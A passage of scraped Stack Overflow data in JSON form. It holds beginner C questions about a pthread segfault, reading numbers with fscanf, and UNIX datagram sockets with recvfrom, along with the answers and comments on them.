(Havent written code for input includes nofChicken andnofCustomers\n\n   /* Initialize the app */\n   initializeData();\n\n  /* Create the producer thread */\n  pthread_create(&amp;chef_t,&amp;attr,chef,NULL);\n\n\n  /* Create the consumer threads */\n  for(i = 1; i &lt;= nofCustomers; i++) \n {\n   info-&gt;id=i;\n   pthread_create(&amp;customer_t[i],&amp;attr,customer,(void *)info);\n }\n\n return 0; \n}\n</code></pre>\n\n<p>Segmentation fault in the BOVE CODE</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1476233272, "post_id": 39988796, "comment_id": 67256415, "body": "You need to calculate <code>area</code> and <code>perimeter</code> for each pair of numbers you read - in the <code>while()</code> loop, after the call to <code>fscanf()</code> and before the call to <code>fprintf()</code>."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1476233309, "post_id": 39988796, "comment_id": 67256426, "body": "@DavidC.Rankin There&#39;s an <code>fscanf()</code> buried in the <code>while()</code>-loop conditional clause."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1476233351, "post_id": 39988796, "comment_id": 67256431, "body": "Yes, I missed it burried under the header <code>:)</code> (after the computation had been made without it)"}, {"owner": {"reputation": 4426, "user_id": 450609, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6708bd9ccabfcb1cf6863fb32f32d1de?s=128&d=identicon&r=PG", "display_name": "dave", "link": "https://stackoverflow.com/users/450609/dave"}, "edited": false, "score": 0, "creation_date": 1476234311, "post_id": 39988796, "comment_id": 67256615, "body": "If you aren&#39;t printing out any values then you know exactly where your problem is: <code>(fscanf(my_data, &quot;%d%d&quot;, &amp;radius, &amp;nsides))==2</code> is false on the first time to that <code>while</code> loop.  Why is that? And you&#39;ll answer your own question (or ask a better one about how to use <code>fscanf</code>)."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 4816291, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-EkJbiP8NYCU/AAAAAAAAAAI/AAAAAAAAAIs/LWE_eIDENwY/photo.jpg?sz=128", "display_name": "nima sarrafzadeh", "link": "https://stackoverflow.com/users/4816291/nima-sarrafzadeh"}, "edited": false, "score": 0, "creation_date": 1476243332, "post_id": 39989053, "comment_id": 67258643, "body": "Thanks! This helps a lot. The reason why I wasn&#39;t seeing errors was because I was using PuTTy I think. I don&#39;t really get why you used int argc, char **argv though, I haven&#39;t seen that before."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 21, "user_id": 4816291, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-EkJbiP8NYCU/AAAAAAAAAAI/AAAAAAAAAIs/LWE_eIDENwY/photo.jpg?sz=128", "display_name": "nima sarrafzadeh", "link": "https://stackoverflow.com/users/4816291/nima-sarrafzadeh"}, "edited": false, "score": 0, "creation_date": 1476244791, "post_id": 39989053, "comment_id": 67259002, "body": "<code>char *argv[]</code> is equivalent to <code>char **argv</code> when used in the parameter list of a function (<code>i.e. main()</code>) because when an array is passed as a parameter, the array is converted to a <i>pointer</i>) Thus <code>int main (int argc, char *argv[])</code> and <code>int main (int argc, char **argv)</code> are equivalent."}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 2, "last_activity_date": 1476235195, "last_edit_date": 1476235195, "creation_date": 1476234812, "answer_id": 39989053, "question_id": 39988796, "link": "https://stackoverflow.com/questions/39988796/trouble-reading-in-values-from-file/39989053#39989053", "title": "Trouble reading in values from file", "body": "<p>Where your immediate issue arises, is your attempt to mix your <code>integer</code> and <code>double</code> reads from the file. Since the file contains values with a <em>decimal point</em>, you will need to read both as <code>double</code> (or <code>float</code>) and then take the real part for your integer <code>nsides</code>.</p>\n\n<p>Your compiler should also be screaming warnings at you for your use of both <code>fscanf</code> and <code>fprintf</code> (specifically given the invalid pointer types and too many arguments for format). If you do not see a number of warning, make sure you always compile with <strong><em>warnings enabled</em></strong> (e.g. with <code>-Wall -Wextra</code>, and for just about all possible warnings, add <code>-pedantic</code>) Do not accept code that compiles with any warnings.</p>\n\n<p>If you rethink your format strings a bit, and include the <code>'\\n'</code> in the format string where it belongs, you can do something like the following: (note it takes the filenames for input/output as the first and second arguments, respectively (defaulting to read/write to <code>stdin/stdout</code> if no arguments are given))</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\nint main (int argc, char **argv) {\n\n    int nsides = 0;\n    double radius, perimeter, area, ntmp;\n    FILE *fp = argc &gt; 1 ? fopen (argv[1], \"r\") : stdin,\n         *ofp = argc &gt; 2 ? fopen (argv[1], \"w+\") : stdout;\n\n    if (!fp || !ofp) {  /* validate files open for reading/writing */\n        fprintf (stderr, \"error: file open failed\\n\");\n        return 1;\n    }\n\n    /* write heading to output file */\n    fprintf (ofp, \"\\nNima Sarrafzadeh. Lab 3.\\n\\n\"\n                  \"          Number  Perimeter     Area Of \\n\"\n                  \" Radius  Of Sides Of Polygon    Polygon \\n\"\n                  \"-------- -------- ------------ ----------- \\n\");\n\n    /* validate 2 values read for each iteration */\n    while (fscanf (fp, \" %lf %lf\", &amp;radius, &amp;ntmp) == 2) {\n        nsides = (int)ntmp;\n        perimeter = 2*nsides*radius*sin(M_PI/nsides);\n        area = 0.5*nsides*(radius*radius)*sin((2*M_PI)/nsides);\n        fprintf (ofp, \"%7.2lf %7d %10.2lf %10.2lf\\n\",\n                radius, nsides, perimeter, area);\n    }\n\n    if (fp != stdin) fclose (fp);     /* close file if not stdin  */\n    if (ofp != stdout) fclose (fp);   /* close file if not stdout */\n\n    return 0;\n}\n</code></pre>\n\n<p>Pay particular attention to the <strong><em>validate</em></strong> comment regarding <code>fscanf</code>.</p>\n\n<p><strong>Example Use/Output</strong></p>\n\n<pre><code>$ ./bin/perim &lt;dat/pairs.txt\n\nNima Sarrafzadeh. Lab 3.\n\n          Number  Perimeter     Area Of\n Radius  Of Sides Of Polygon    Polygon\n-------- -------- ------------ -----------\n   4.20       6      25.20      45.83\n   3.10       4      17.54      19.22\n  10.50      10      64.89     324.02\n  23.00       8     140.83    1496.24\n   9.70       4      54.87     188.18\n  15.90       5      93.46     601.09\n</code></pre>\n\n<p>Look things over and let me know if you have further questions.</p>\n"}], "owner": {"reputation": 21, "user_id": 4816291, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-EkJbiP8NYCU/AAAAAAAAAAI/AAAAAAAAAIs/LWE_eIDENwY/photo.jpg?sz=128", "display_name": "nima sarrafzadeh", "link": "https://stackoverflow.com/users/4816291/nima-sarrafzadeh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1476994318, "creation_date": 1476232610, "last_edit_date": 1476994318, "question_id": 39988796, "link": "https://stackoverflow.com/questions/39988796/trouble-reading-in-values-from-file", "title": "Trouble reading in values from file", "body": "<p>My data looks like this:</p>\n\n<pre><code>  4.2    6.0\n\n  3.1    4.0\n\n 10.5   10.0\n\n 23.0    8.0\n\n 9.7     4.0\n\n 15.9    5.0\n</code></pre>\n\n<p>I am trying to read in two values at a time, assign them to my variable, and print out the results. I can't figure out <strong>why the values are not getting read in</strong>. My template prints out to my output txt file but none of my values below it print out.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n#define INPUT_FILE \"lab3.dat\"\n#define ANSWER_FILE \"lab3.txt\"\n\nint main(void)\n{\nint nsides;\ndouble radius;\ndouble perimeter;\ndouble area;\n\nFILE* my_data;\nFILE* out_file;\n\nmy_data = fopen(INPUT_FILE, \"r\");\nif(my_data == NULL)\n{\n    printf(\"Error on opening the data file\\n\");\n    exit(0);\n}\n\nout_file = fopen(ANSWER_FILE,\"w\");\nif(out_file == NULL)\n{   \n    printf(\"Error on opening the output file\\n\");\n    exit(0);\n}\n\nperimeter = 2*nsides*radius*sin(M_PI/nsides);\narea = 0.5*nsides*(radius*radius)*sin((2*M_PI)/nsides);\n\nfprintf(out_file, \"\\nNima Sarrafzadeh. Lab 3.\\n\\n\");\nfprintf(out_file, \"         Number Perimeter Area Of \\n\");\nfprintf(out_file, \" Radius Of Sides Of Polygon Polygon \\n\");\nfprintf(out_file, \"-------- -------- ------------ ----------- \\n\");\nwhile((fscanf(my_data, \"%d%d\", &amp;radius, &amp;nsides))==2){\n    fprintf(out_file, \"%d %d %d %d\",radius, nsides, perimeter, area, \"\\n\");\n}\n\nfclose(my_data);\nfclose(out_file);\n}       \n</code></pre>\n"}, {"tags": ["c", "sockets", "unix-socket"], "comments": [{"owner": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1476231080, "post_id": 39988609, "comment_id": 67255953, "body": "&quot;sent to a domain socket&quot; -&gt; given the tag, am I right to assume that you mean UNIX domain socket?"}, {"owner": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1476231297, "post_id": 39988609, "comment_id": 67255996, "body": "Also, are you sure that your socket works at all? AFAIK, you shouldn&#39;t need to be stuck in <code>recvfrom</code> for a <code>send</code>/<code>sendto</code> call from P2 to complete successfully, the messages should be queued provided that the socket does exist."}, {"owner": {"reputation": 721, "user_id": 3116573, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/BRi6O.jpg?s=128&g=1", "display_name": "A_toaster", "link": "https://stackoverflow.com/users/3116573/a-toaster"}, "reply_to_user": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1476231784, "post_id": 39988609, "comment_id": 67256098, "body": "@zneak yes, this is a unix domain socket (running on Raspbian). The sockets definitely do work, in another section of code I run <code>listenOnSocket</code> without any timeout, and the program sits on the <code>recvfrom</code> function while it waits for input."}, {"owner": {"reputation": 721, "user_id": 3116573, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/BRi6O.jpg?s=128&g=1", "display_name": "A_toaster", "link": "https://stackoverflow.com/users/3116573/a-toaster"}, "reply_to_user": {"reputation": 123967, "user_id": 251153, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4b25144c09555e7d5b5e288469e011ef?s=128&d=identicon&r=PG", "display_name": "zneak", "link": "https://stackoverflow.com/users/251153/zneak"}, "edited": false, "score": 0, "creation_date": 1476231815, "post_id": 39988609, "comment_id": 67256108, "body": "Adding a bit more info to the question now"}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476233192, "post_id": 39988609, "comment_id": 67256400, "body": "I&#39;m assuming you are using <code>SOCK_DGRAM</code> due to use of <code>recvfrom()</code>. Why do you think you need to <code>listen()</code>? Why is <code>bind()</code> not sufficient?"}, {"owner": {"reputation": 721, "user_id": 3116573, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/BRi6O.jpg?s=128&g=1", "display_name": "A_toaster", "link": "https://stackoverflow.com/users/3116573/a-toaster"}, "reply_to_user": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476233901, "post_id": 39988609, "comment_id": 67256535, "body": "@alvits Apologies if I am misunderstanding, I thought that <code>bind()</code> was used to just create the actual socket file that sits on disk, so that other processes know what name to send data to"}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476234172, "post_id": 39988609, "comment_id": 67256588, "body": "Your understanding is correct. <code>bind()</code> creates it. The client then needs to <code>sendto()</code> this socket, whle the server <code>recvfrom()</code> this socket. No <code>listen()</code>ing involved."}, {"owner": {"reputation": 4426, "user_id": 450609, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6708bd9ccabfcb1cf6863fb32f32d1de?s=128&d=identicon&r=PG", "display_name": "dave", "link": "https://stackoverflow.com/users/450609/dave"}, "edited": false, "score": 0, "creation_date": 1476234180, "post_id": 39988609, "comment_id": 67256590, "body": "Where is your code for <code>listenOnSocket</code>? How can we work out what is going on without any code?"}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476234261, "post_id": 39988609, "comment_id": 67256604, "body": "You have to be clear and post whether your socket is connection oriented or datagram. My assumption may not be what you really have."}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476234373, "post_id": 39988609, "comment_id": 67256628, "body": "To answer your question, yes, on datagram you can <code>recvfrom()</code> messages sent by client via <code>sendto()</code> without <code>listen()</code>ing. However, on socket stream, you need to <code>listen()</code> and <code>accept()</code> each connections."}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 3, "creation_date": 1476234792, "post_id": 39988609, "comment_id": 67256698, "body": "That&#39;s the source of your issue. <code>listenOnsocket()</code> always deletes and creates a new socket. You should only create the socket once on entry of server code then loop on <code>recvfrom()</code>. This create and delete loop will trash anything that is queued in the socket."}], "answers": [{"tags": [], "owner": {"reputation": 180843, "user_id": 424499, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bc2071afd499daef001e75e14d7f9cce?s=128&d=identicon&r=PG", "display_name": "Raymond Hettinger", "link": "https://stackoverflow.com/users/424499/raymond-hettinger"}, "is_accepted": true, "score": 1, "last_activity_date": 1476234918, "creation_date": 1476234918, "answer_id": 39989071, "question_id": 39988609, "link": "https://stackoverflow.com/questions/39988609/can-the-recvfrom-function-be-used-to-check-whether-there-have-been-any-previou/39989071#39989071", "title": "Can the `recvfrom` function be used to check whether there have been any previous data sent to a socket? Or does it need to be actively listening?", "body": "<p>Once you've bound the socket, the datagrams will accumulate in a buffer and can be read later using <em>recvfrom</em>.  That said, if the buffer overflows, messages may be discarded.</p>\n"}, {"tags": [], "owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "is_accepted": false, "score": 2, "last_activity_date": 1476235790, "creation_date": 1476235790, "answer_id": 39989168, "question_id": 39988609, "link": "https://stackoverflow.com/questions/39988609/can-the-recvfrom-function-be-used-to-check-whether-there-have-been-any-previou/39989168#39989168", "title": "Can the `recvfrom` function be used to check whether there have been any previous data sent to a socket? Or does it need to be actively listening?", "body": "<blockquote>\n  <p>I guess this means I should separate the creation of the socket from the recvfrom function, because the short period where the new socket is created it does not exist</p>\n</blockquote>\n\n<p>That is correct. If you open and close the socket every time in your <code>listenOnSocket()</code> socket, (a) you will lose any datagrams that got queued that you didn't read, and (b) sends while the socket is closed will fail ... of course. Nothing for them to send to.</p>\n"}], "owner": {"reputation": 721, "user_id": 3116573, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/BRi6O.jpg?s=128&g=1", "display_name": "A_toaster", "link": "https://stackoverflow.com/users/3116573/a-toaster"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 546, "favorite_count": 0, "accepted_answer_id": 39989071, "answer_count": 2, "score": 4, "last_activity_date": 1476235790, "creation_date": 1476230920, "last_edit_date": 1476234575, "question_id": 39988609, "link": "https://stackoverflow.com/questions/39988609/can-the-recvfrom-function-be-used-to-check-whether-there-have-been-any-previou", "title": "Can the `recvfrom` function be used to check whether there have been any previous data sent to a socket? Or does it need to be actively listening?", "body": "<p>I have a <code>while(1)</code> loop that uses <code>recvfrom</code> to get data that has been sent to a domain socket from another process (P2).</p>\n\n<p>The while loop needs to do 2 things, firstly listen for incoming data from P2, and secondly run another function <code>checkVoltage()</code>.</p>\n\n<p>So it runs a little something like this:</p>\n\n<pre><code>while(true)\n{\n    listenOnSocket() /*listens for 100 u seconds*/\n    checkVoltage();\n}\n</code></pre>\n\n<p>My issue is this: the <code>listenOnSocket()</code> function uses the <code>recvfrom</code> function to check for an input from another process. It spends 100usecs listening, then times out and proceeds to run the <code>checkVoltage()</code> function. So it spends like 99% of the time in the <code>listenOnSocket()</code> function. My issue is that if P2 sends information to the socket during the <code>checkVoltage()</code> function, then it will result in an error, stating: <code>sending datagram message: No such file or directory</code>.</p>\n\n<p>Is there a way to have this loop check for any data that has been sent to the socket previously? That way if P2 sends data during the <code>checkVoltage()</code> function, it will not result in an error.</p>\n\n<p>Thanks.</p>\n\n<p>EDIT:</p>\n\n<p>So the <code>listenOnSocket()</code> function creates a socket with the name <code>FireControl</code> when I run P1 (the program that receives data from P2) the <code>FireControl</code> file vanishes for a split second then reappears. If P2 sends data to P1 during this short period, it results in the error mentioned up top.</p>\n\n<p>So I guess this means I should separate the creation of the socket from the <code>recvfrom</code> function, because the short period where the new socket is created it does not exist - if that makes sense.</p>\n\n<p>I'm a dope, I should've separated them in the first place!</p>\n\n<p>EDIT2: Here is <code>listenOnSocket()</code>:</p>\n\n<pre><code>command listenOnSocket(int timeout, float utimeout) /*Returns null payload when no input is detected*/\n{\n    command payload;\n    int sock;\n    socklen_t* length;\n    struct sockaddr_un name;\n    char buf[1024];\n\n    struct timeval tv;\n    tv.tv_sec = timeout;\n    tv.tv_usec = utimeout;\n\n    /* Create socket from which to read. */\n    sock = socket(AF_UNIX, SOCK_DGRAM, 0);\n    if (sock &lt; 0) \n    {\n        perror(\"opening datagram socket\");\n        payload = nullPayload;\n    }\n\n    /* Create name. */\n    name.sun_family = AF_UNIX;\n    strcpy(name.sun_path, NAME);\n\n    unlink(name.sun_path);\n\n    /* Bind the UNIX domain address to the created socket */\n    if (bind(sock, (struct sockaddr *) &amp;name, sizeof(struct sockaddr_un))) \n    {\n        perror(\"binding name to datagram socket\\n\");\n        payload = nullPayload;\n    }\n\n    /*Socket has been created at NAME*/\n    if (timeout != 0 || utimeout != 0)\n    {\n        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;tv, sizeof(struct timeval));\n    }\n    else\n    {\n        tv.tv_sec = 0;\n        tv.tv_usec = 0;\n        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;tv, sizeof(struct timeval));\n    }\n    /* Read from the socket */\n    if (recvfrom(sock, &amp;payload, sizeof(command), 0, (struct sockaddr *)&amp;name, &amp;length) &lt; 0) /*Less than zero results from a timeout*/\n    {\n        payload = nullPayload;\n    }\n\n    unlink(NAME);   \n    return payload;\n}\n</code></pre>\n\n<p>and here is the loop that calls it:</p>\n\n<pre><code>while (1)\n    {\n        buffer = getADCValue();\n\n        checkVoltage();\n\n        temp = listenOnSocket(0, 100); /*Look for a new command*/\n        doStuffWithTempIfItHasChanged();\n        }\n    }\n</code></pre>\n"}]